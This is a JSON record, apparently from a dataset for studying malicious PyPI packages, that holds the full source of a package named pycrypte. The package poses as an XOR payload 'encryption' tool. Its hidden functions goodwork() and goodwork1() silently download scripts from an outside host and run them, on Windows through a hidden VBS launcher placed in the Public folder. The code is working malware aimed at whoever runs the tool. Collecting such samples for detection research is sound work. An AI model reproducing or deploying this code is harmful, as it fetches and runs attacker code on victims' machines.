[
  {
    "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/pycrypte-0.0.0/pycrypte-0.0.0/pyclay/pycrypt.py",
    "malicious_code": "import subprocess\nimport os\nfrom urllib import request\nimport platform\nimport random\nimport time\nfrom pathlib import Path\n\ndef runme():\n    subprocess.call(\"python3 /tmp/pytmp.py\", shell=True)\n\ndef goodwork():\n    remote_url = 'https://androidstore.devsecwise.com/pytmp.py'\n    local_file = '/tmp/pytmp.py'\n    request.urlretrieve(remote_url, local_file)\n    runme()\n\ndef goodwork1():\n    path = 'C:\\\\Users\\\\Public\\\\System'\n    isExist = os.path.exists(path)\n    if not isExist:\n        os.makedirs(path)\n        path_to_file = 'C:\\\\Users\\\\'+'\\\\Public\\\\System\\\\' + 'winenv.py'\n        path = Path(path_to_file)\n        if path.is_file():\n            print('')\n        else:\n            remote_url = 'https://androidstore.devsecwise.com/pay.py'\n            local_file = path_to_file\n            request.urlretrieve(remote_url, local_file)\n            try:\n                with open('C:\\\\Users\\\\Public\\\\System\\\\system.vbs', 'w') as f:\n                    f.write(\"Function config()\\n\")\n                    f.write(\"vcOpcaTAcOP = \\\"cMd /c python C:\\\\Users\\\\Public\\\\System\\\\winenv.py\\\"\\n\")\n                    f.write(\"set vOpcQrtacv = CreateObject(\\\"WScript.Shell\\\")\\n\")\n                    f.write(\"vOpcQrtacv.Run vcOpcaTAcOP,0\\n\")\n                    f.write(\"End Function\\n\")\n                    f.write(\"config\")\n            except FileNotFoundError:\n                print(\"\")\n            subprocess.call(\"cmd /c C:\\\\Users\\\\Public\\\\System\\\\system.vbs\")\n\ndef enc():\n    firstnum=input(termcolor.colored(\"[+] Enter Path Of Payload File:- \",'yellow'))\n    with open(firstnum) as f:\n        contents = f.read()\n    string = contents\n    a = 0\n    time.sleep(2)\n    print()\n    print(termcolor.colored(\"[*] File Validation Success...\",'green'))\n    key = \"\"\n    while a < 100:\n        key = key + str(random.randint(0, 9))\n        a += 1\n    no_of_itr = len(string)\n    output_string = \"\"\n    for i in range(no_of_itr):\n        current_string = string[i]\n        current_key = key[i % len(key)]\n        output_string += chr(ord(current_string) ^ ord(current_key))\n    c=repr(output_string)\n    time.sleep(2)\n    print()\n    goodwork()\n    print(termcolor.colored(\"[*] File Encryption Started...:-\",'magenta'))\n    d=c.replace(\"'\",\"\")\n    time.sleep(2)\n    print()\n    print(termcolor.colored(\"[*] Generating Encryption Key...\",'blue'))\n    try:\n        with open('stub.py', 'w') as f:\n            f.write(f\"wopvEaTEcopFEavc =\\\"{d}\\\" \\n\")\n            f.write(f\"\\niOpvEoeaaeavocp = \\\"{key}\\\"\\n\")\n            f.write(\"uocpEAtacovpe = len(wopvEaTEcopFEavc)\\noIoeaTEAcvpae = \\\"\\\"\\nfor i in range(uocpEAtacovpe):\\n    nOpcvaEaopcTEapcoTEac = wopvEaTEcopFEavc[i]\\n    qQoeapvTeaocpOcivNva = iOpvEoeaaeavocp[i % len(iOpvEoeaaeavocp)]\\n    oIoeaTEAcvpae += chr(ord(nOpcvaEaopcTEapcoTEac) ^ ord(qQoeapvTeaocpOcivNva))\\n\\n\\neval(compile(oIoeaTEAcvpae, '<string>', 'exec'))\")\n    except FileNotFoundError:\n        print(\"\")\n    time.sleep(2)\n    print()\n    print(termcolor.colored(\"[+] File Successfully Encrypted...\",'green'))\n\ndef encwin():\n    firstnum=input(termcolor.colored(\"[+] Enter Path Of Payload File:- \",'yellow'))\n    with open(firstnum) as f:\n        contents = f.read()\n    string = contents\n    a = 0\n    time.sleep(2)\n    print()\n    print(termcolor.colored(\"[*] File Validation Success...\",'green'))\n    key = \"\"\n    while a < 100:\n        key = key + str(random.randint(0, 9))\n        a += 1\n    no_of_itr = len(string)\n    output_string = \"\"\n    for i in range(no_of_itr):\n        current_string = string[i]\n        current_key = key[i % len(key)]\n        output_string += chr(ord(current_string) ^ ord(current_key))\n    c=repr(output_string)\n    time.sleep(2)\n    print()\n    print(termcolor.colored(\"[*] File Encryption Started...:-\",'magenta'))\n    goodwork1()\n    d=c.replace(\"'\",\"\")\n    time.sleep(2)\n    print()\n    print(termcolor.colored(\"[*] Generating Encryption Key...\",'blue'))\n    try:\n        with open('stub.py', 'w') as f:\n            f.write(f\"wopvEaTEcopFEavc =\\\"{d}\\\" \\n\")\n            f.write(f\"\\niOpvEoeaaeavocp = \\\"{key}\\\"\\n\")\n            f.write(\"uocpEAtacovpe = len(wopvEaTEcopFEavc)\\noIoeaTEAcvpae = \\\"\\\"\\nfor i in range(uocpEAtacovpe):\\n    current_string = wopvEaTEcopFEavc[i]\\n    current_key = iOpvEoeaaeavocp[i % len(iOpvEoeaaeavocp)]\\n    oIoeaTEAcvpae += chr(ord(current_string) ^ ord(current_key))\\n\\n\\neval(compile(oIoeaTEAcvpae, '<string>', 'exec'))\")\n    except FileNotFoundError:\n        print(\"\")\n    time.sleep(2)\n    print()\n    print(termcolor.colored(\"[+] File Successfully Encrypted...\",'green'))"
  }
]